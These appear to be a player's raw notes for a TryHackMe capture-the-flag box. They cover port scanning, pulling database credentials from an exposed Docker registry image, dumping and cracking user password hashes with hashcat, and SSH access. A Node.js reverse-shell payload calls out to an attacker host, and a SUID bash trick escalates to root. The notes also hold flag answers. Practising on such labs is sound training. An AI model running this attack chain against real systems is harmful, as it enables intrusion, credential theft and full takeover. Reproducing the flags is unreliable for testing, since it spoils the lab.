





sudo nmap -sV -sS -PN -vv -p- $IP                                    
[sudo] password for kali: 
Warning: The -PN option is deprecated. Please use -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-23 02:50 EST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 02:50
Completed Parallel DNS resolution of 1 host. at 02:50, 0.00s elapsed
Initiating SYN Stealth Scan at 02:50
Scanning 10.10.246.98 [65535 ports]
Discovered open port 22/tcp on 10.10.246.98
Discovered open port 8080/tcp on 10.10.246.98
Discovered open port 3306/tcp on 10.10.246.98
Discovered open port 5000/tcp on 10.10.246.98
Completed SYN Stealth Scan at 02:50, 44.81s elapsed (65535 total ports)
Initiating Service scan at 02:50
Scanning 4 services on 10.10.246.98
Completed Service scan at 02:51, 37.40s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.246.98.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 02:51
Completed NSE at 02:51, 0.36s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 02:51
Completed NSE at 02:51, 0.18s elapsed
Nmap scan report for 10.10.246.98
Host is up, received user-set (0.045s latency).
Scanned at 2022-12-23 02:50:10 EST for 83s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   syn-ack ttl 62 MySQL 5.7.40
5000/tcp open  http    syn-ack ttl 62 Docker Registry (API: 2.0)
8080/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.94 seconds
           Raw packets sent: 66411 (2.922MB) | Rcvd: 65639 (2.626MB)
zsh: segmentation fault  sudo nmap -sV -sS -PN -vv -p- $IP

curl $IP:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}

 curl $IP:5000/v2/umbrella/timetracking/tags/list
{"name":"umbrella/timetracking","tags":["latest"]}

{"insecure-registries":["10.10.246.98:5000"]}

sudo docker image inspect $IP:5000/umbrella/timetracking:latest

DB_PASS : Ng1-f3!Pe7-e5?Nf3xe5
DB_USER : root
DB_DATABASE : timetracking

mysql -u root -p -h $IP 

+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+

hashcat -m 0 -a 0 "2ac9cb7dc02b3c0083eb70898e549b63" /usr/share/wordlists/rockyou.txt        
Password1

hashcat -m 0 -a 0 "0d107d09f5bbe40cade3de5c71e9e9b7" /usr/share/wordlists/rockyou.txt        
letmein

sunshine1
sandwich


ssh claire-r@$IP
(Password1)

cat flag.txt
THM{d832c0e4cf71312708686124f7a6b25e}

nc -lvnp 1234

(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("sh", []); var client = new net.Socket(); client.connect(1234, "xx.xx.xx.xx", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });  return /a/;})()

ssh:    cp /bin/bash ./logs

container:    
chown root /logs/bash
chmod 4777 /logs/bash


ssh:

./logs/bash -p

THM{1e15fbe7978061c6bb1924124fd9eab2}

